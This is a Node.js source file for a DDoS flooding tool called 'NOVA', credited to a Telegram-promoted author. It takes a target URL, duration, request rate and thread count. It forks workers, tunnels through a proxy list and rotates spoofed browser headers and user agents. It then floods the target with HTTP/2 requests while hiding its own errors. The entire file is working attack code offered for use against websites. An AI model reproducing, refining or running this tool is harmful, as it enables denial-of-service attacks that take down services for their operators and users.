const net = require('net'),
    http2 = require('http2'),
    tls = require('tls'),
    cluster = require('cluster'),
    url = require('url'),
    crypto = require('crypto'),
    fs = require('fs');

process.setMaxListeners(0), require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){console.log(`[!] node nova.js <HOST> <TIME> <RPS> <THREADS> .`); process.exit();}

const secureOptions = crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION | crypto.constants.SSL_OP_COOKIE_EXCHANGE,
    cplist = ['RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    ecdhCurve = 'GREASE:x25519:secp256r1:secp384r1',
    secureProtocol = 'TLS_client_method',
    headers = {},
    secureContextOptions = {
        'ciphers': cipper,
        'sigalgs': sigalgs,
        'honorCipherOrder': true,
        'secureOptions': secureOptions,
        'secureProtocol': secureProtocol
    },
    secureContext = tls.createSecureContext(secureContextOptions);

var proxyFile = 'proxy.txt',
    proxies = readLines(proxyFile),
    userAgents = readLines('ua.txt');

const args = {
        'target': process.argv[2],
        'time': ~~process.argv[3],
        'Rate': ~~process.argv[4],
        'threads': ~~process.argv[5]
    },
    parsedTarget = url.parse(args.target);
	const coloredString = "💻  | Method by @ShadowRIFX, Follow us on Telegram";

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear(); 
    console.log(`+-------------------------------------------------+`);
    console.log(`| ${coloredString}                     `);
    console.log(`+-------------------------------------------------+`);
    console.log("| 💡  | Succesfully Running !! NOVA by Leonardo");
    console.log("| 🤖  | Target: " + process.argv[2]);
    console.log("| ⌚  | Time: "+ process.argv[3]);
    console.log("| 🕹️  | Rate: "+ process.argv[4]);
    console.log("| 📡  | Threads: "+ process.argv[5]);
    console.log(`+-------------------------------------------------+`);
    setTimeout(() => {
        process.exit(1);
    }, process.argv[3] * 1000);
} else {
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 0);
    }
}

class NetSocket {
    constructor() {}

    connect(proxy, callback) {
        const proxyParts = proxy.address.split(':'),
            proxyHost = proxyParts[0],
            proxyPort = proxyParts[1],
            connectRequest = 'CONNECT ' + proxy.address + ':443 HTTP/1.1\r\nHost: ' + proxy.address + ':443\r\n\r\n',
            connectBuffer = new Buffer.from(connectRequest),
            socket = net.connect({
                'host': proxy.host,
                'port': proxy.port,
                'allowHalfOpen': true,
                'writable': true,
                'readable': true
            });

        socket.setTimeout(proxy.timeout * 10000), socket.setKeepAlive(true, 10000), socket.setNoDelay(true);
        socket.on('connect', () => {
            socket.write(connectBuffer);
        });
        socket.on('data', data => {
            const dataStr = data.toString('utf-8'),
                includesSuccess = dataStr.includes('HTTP/1.1 200');
            if (!includesSuccess) return socket.destroy(), callback(undefined, 'error: invalid response from proxy server');
            return callback(socket, undefined);
        });
        socket.on('timeout', () => {
            return socket.destroy(), callback(undefined, 'error: timeout exceeded');
        });
        socket.on('error', err => {
            return socket.destroy(), callback(undefined, 'error: ' + err);
        });
    }
}

const Socker = new NetSocket();

function readLines(filename) {
    return fs.readFileSync(filename, 'utf-8').toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(array) {
    return array[randomIntn(0, array.length)];
}

headers[':method'] = 'GET', headers[':authority'] = parsedTarget.host, headers[':scheme'] = 'https', headers[':path'] = '/', headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', headers['accept-language'] = 'es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3', headers['accept-encoding'] = 'gzip, deflate, br', headers['content-type'] = 'text/html', headers['Except'] = '100-continue', headers['x-forwarded-proto'] = 'https', headers['x-forwarded-for'] = 'user@gmail.com', headers['Max-Forwards'] = '10', headers['origin'] = 'https://' + parsedTarget.host, headers['pragma'] = 'no-cache', headers['cache-control'] = 'no-cache, no-store,private, max-age=0, must-revalidate', headers['upgrade-insecure-requests'] = '1', headers['sec-fetch-site'] = 'same-origin', headers['sec-fetch-mode'] = 'navigate', headers['sec-fetch-dest'] = 'document', headers['sec-ch-ua-mobile'] = randomElement(['?0', '?1']), headers['sec-ch-ua-platform'] = randomElement(['Windows', 'Android', 'Linux', 'macOS', 'iOS']);

function runFlooder() {
    const proxy = randomElement(proxies),
        proxyParts = proxy.split(':');
    headers['host'] = parsedTarget.host, headers['user-agent'] = randomElement(userAgents), headers['x-forwarded-for'] = proxyParts[0];

    const proxyOptions = {
        'host': proxyParts[0],
        'port': ~~proxyParts[1],
        'address': parsedTarget.host + ':443',
        'timeout': 15
    };

    Socker.connect(proxyOptions, (socket, err) => {
        if (err) return;
        socket.setKeepAlive(true, 60000), socket.setNoDelay(true);

        const settings = {
                'enablePush': false,
                'initialWindowSize': 1073741823
            },
            tlsOptions = {
                'port': 443,
                'secure': true,
                'ALPNProtocols': ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
                'ciphers': cipper,
                'sigalgs': sigalgs,
                'requestCert': true,
                'socket': socket,
                'ecdhCurve': ecdhCurve,
                'honorCipherOrder': true,
                'host': parsedTarget.host,
                'rejectUnauthorized': false,
                'clientCertEngine': 'dynamic',
                'secureOptions': secureOptions,
                'secureContext': secureContext,
                'servername': parsedTarget.host,
                'secureProtocol': secureProtocol
            },
            tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsSocket.ALPN_ENABLED = true, tlsSocket.setNoDelay(true), tlsSocket.setKeepAlive(true, 60 * 1000), tlsSocket.setTimeout(0);

        const client = http2.connect(parsedTarget.href, {
            'protocol': 'https',
            'settings': settings,
            'maxSessionMemory': 3333,
            'maxDeflateDynamicTableSize': 4294967295,
            'createConnection': () => tlsSocket
        });

        client.setTimeout(0), client.settings(settings);
        client.on('connect', () => {
            const interval = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers['referer'] = 'https://' + parsedTarget.host + parsedTarget.path;
                    const req = client.request(headers).on('response', response => {
                        req.close(), req.destroy();
                        return;
                    });
                    req.end();
                }
            }, 1000);
        });

        client.on('close', () => {
            client.destroy(), socket.destroy();
            });

        client.on('error', err => {
            client.destroy(), socket.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000), process.on('uncaughtException', err => {}), process.on('unhandledRejection', err => {});